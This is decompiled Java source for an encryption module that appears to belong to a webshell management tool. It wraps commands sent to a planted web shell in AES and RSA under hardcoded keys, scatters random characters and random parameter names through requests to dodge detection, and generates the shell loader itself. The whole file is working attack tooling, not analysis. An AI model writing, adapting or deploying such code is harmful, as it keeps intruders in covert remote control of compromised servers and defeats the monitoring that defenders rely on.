/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaRSA;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
import java.net.URLEncoder;
import java.security.Key;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.interfaces.RSAKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import shells.cryptions.JavaRSA.Generate;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name="JAVA_RSA", payloadName="JavaDynamicPayload")
public class JavaRSA
implements Cryption {
    private ShellEntity shell;
    private Http http;
    private boolean state;
    private byte[] payload;
    private String pass;
    private static final SecureRandom random = new SecureRandom();
    private static final String aesMode = "AES/CFB/NoPadding";
    private String PublicKeyStr = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAMFFSCqK6s7dRRuDlh2LYy8QwCIqPAjFQF6uY2DhIdU2zzR1VwMLpqYmA9jj7fDhFh8k5pnfi4nmYyu+9ACr67UCAwEAAQ==";
    private String PrivateKeyStr = "MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAwUVIKorqzt1FG4OWHYtjLxDAIio8CMVAXq5jYOEh1TbPNHVXAwumpiYD2OPt8OEWHyTmmd+LieZjK770AKvrtQIDAQABAkAosBI6SpaWSET1PuWKgL63uNoKF0QeQJCFnkbzrVG3Ff3dkv0dDr1vDkw+11hR4dFCs91+zpSAzsFXhoKyoGd9AiEA8Y8Op87MCJSwxwT9kzNZfCkHvdnLKYxOa6l5jS1fpmcCIQDM0zJr4vZ76aT5MWxkGzXKdDDvVFSrVJLTCyb8fErzgwIhAImLYNfya8FzERmx4MWhlpGZN1xGGGXHC5xIOvtFW9J/AiEApslbh4qbV6+cDOb38lRN6vvOVTSAdbs6i+vK5VJ43e0CICU6hajYbx4JpxziEY06MGBS9u8+wW+C8NoavFo9xl3b";
    private byte[] publicKeyBytes = Base64.getDecoder().decode(this.PublicKeyStr);
    private byte[] privateKeyBytes = Base64.getDecoder().decode(this.PrivateKeyStr);

    public static byte[] hex2b(String data) {
        byte[] byteArray = new BigInteger(data, 36).toByteArray();
        if (byteArray[0] == 0) {
            byte[] output = new byte[byteArray.length - 1];
            System.arraycopy(byteArray, 1, output, 0, output.length);
            return output;
        }
        return byteArray;
    }

    public static String b2hex(byte[] data) {
        return new BigInteger(1, data).toString(36).toLowerCase();
    }

    public static String b2s(byte[] data) {
        try {
            return new String(data, "utf-8");
        } catch (Exception e) {
            return "";
        }
    }

    public static byte[] s2b(String data) {
        try {
            return data.getBytes("utf-8");
        } catch (Exception e) {
            return new byte[0];
        }
    }

    public static String randLetter(int len) {
        if (len == 0) {
            len = random.nextInt(5) + 1;
        }
        StringBuilder s = new StringBuilder();
        while (len-- > 0) {
            s.append((char)(97 + (int)(Math.random() * 26.0)));
        }
        return s.toString();
    }

    public static String randomChar(int len) {
        StringBuilder s = new StringBuilder();
        len = random.nextInt(len) + 1;
        for (int i = 0; i < len; ++i) {
            s.append((char)(19968 + (int)(Math.random() * 20901.0)));
        }
        return JavaRSA.b2s(s.toString().getBytes());
    }

    public static String insertRandomChar(String data) {
        StringBuilder s = new StringBuilder();
        try {
            for (int i = 0; i < data.length(); ++i) {
                char ch = data.charAt(i);
                s.append(ch);
                if (random.nextInt() % 11 == 0) {
                    s.append(JavaRSA.randomChar(1));
                    continue;
                }
                if (random.nextInt() % 11 != 0) continue;
                s.append(JavaRSA.randLetter(1).toUpperCase());
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return s.toString();
    }

    public static byte[] aesEncrypt(byte[] s, String k) {
        try {
            Cipher c = Cipher.getInstance(aesMode);
            c.init(1, (Key)new SecretKeySpec(k.getBytes(), "AES"), new IvParameterSpec(k.getBytes()));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String obf_req(String data) {
        data = JavaRSA.insertRandomChar(data);
        ArrayList<String> params = new ArrayList<String>();
        int left = data.length();
        int now = 0;
        while (left != 0) {
            int len = random.nextInt(30) + 10;
            len = len > left ? left : len;
            String value = data.substring(now, now + len);
            String key = JavaRSA.randLetter(0);
            params.add(key + "=" + value);
            left -= len;
            now += len;
        }
        return String.join((CharSequence)"&", params);
    }

    public static byte[] base64Decode(byte[] bytes) {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", byte[].class).invoke(decoder, new Object[]{bytes});
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, new String(bytes));
            } catch (Exception exception) {
                // empty catch block
            }
        }
        return value;
    }

    public byte[] aes256(byte[] s, int mode) {
        try {
            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
            IvParameterSpec ivParameterSpec = new IvParameterSpec(JavaRSA.base64Decode("jqQX+kVKd9FqgFWQZoSL3g==".getBytes()));
            c.init(mode, (Key)new SecretKeySpec(JavaRSA.base64Decode("SMD6c9EaslWjUSTZW5HNfYKV6NUATLub+uNO3Ey+nHA=".getBytes()), "AES"), ivParameterSpec);
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception exception) {
                // empty catch block
            }
        }
        return value;
    }

    public static byte[] rsa_publickey(byte[] input, int mode, byte[] publicKeyBytes) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publicKeyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PublicKey publicKey = keyFactory.generatePublic(keySpec);
        int keySize = ((RSAKey)((Object)publicKey)).getModulus().bitLength();
        int MAX_BLOCK = mode == 1 ? keySize / 8 - 11 : keySize / 8;
        cipher.init(mode, publicKey);
        int inputLength = input.length;
        int offset = 0;
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        while (inputLength - offset > 0) {
            int blockSize = Math.min(inputLength - offset, MAX_BLOCK);
            byte[] processedBlock = cipher.doFinal(input, offset, blockSize);
            outputStream.write(processedBlock);
            offset += blockSize;
        }
        return outputStream.toByteArray();
    }

    public static byte[] rsa_privatekey(byte[] input, int mode, byte[] privateKeyBytes) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PrivateKey privateKey = keyFactory.generatePrivate(keySpec);
        int keySize = ((RSAKey)((Object)privateKey)).getModulus().bitLength();
        int MAX_BLOCK = mode == 1 ? keySize / 8 - 11 : keySize / 8;
        cipher.init(mode, privateKey);
        int inputLength = input.length;
        int offset = 0;
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        while (inputLength - offset > 0) {
            int blockSize = Math.min(inputLength - offset, MAX_BLOCK);
            byte[] processedBlock = cipher.doFinal(input, offset, blockSize);
            outputStream.write(processedBlock);
            offset += blockSize;
        }
        return outputStream.toByteArray();
    }

    public static byte[] toHex(byte[] bytes) {
        int l = bytes.length;
        byte[] out = new byte[l * 2];
        int j = 0;
        for (int i = 0; i < l; ++i) {
            byte b = bytes[i];
            out[j++] = (byte)Character.forDigit(b >> 4 & 0xF, 16);
            out[j++] = (byte)Character.forDigit(b & 0xF, 16);
        }
        return out;
    }

    public static byte[] base64Encode(byte[] bytes) {
        return Base64.getEncoder().encode(bytes);
    }

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            String pass_str = "sign";
            byte[] final_byte = data;
            final_byte = this.aes256(final_byte, 1);
            final_byte = JavaRSA.rsa_privatekey(final_byte, 1, this.privateKeyBytes);
            final_byte = JavaRSA.base64Encode(final_byte);
            return (pass_str + "=" + URLEncoder.encode(functions.base64EncodeToString(final_byte))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public static byte[] fromHex(byte[] hexBytes) {
        int l = hexBytes.length / 2;
        byte[] out = new byte[l];
        int i = 0;
        int j = 0;
        while (i < l) {
            int high = Character.digit(hexBytes[j], 16);
            int low = Character.digit(hexBytes[j + 1], 16);
            out[i] = (byte)((high << 4) + low);
            ++i;
            j += 2;
        }
        return out;
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            byte[] decode_final_byte = data;
            decode_final_byte = JavaRSA.rsa_privatekey(decode_final_byte, 2, this.privateKeyBytes);
            decode_final_byte = JavaRSA.fromHex(decode_final_byte);
            return decode_final_byte;
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    @Override
    public boolean isSendRLData() {
        return true;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        try {
            return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    static {
        random.setSeed(new Date().getTime());
    }
}

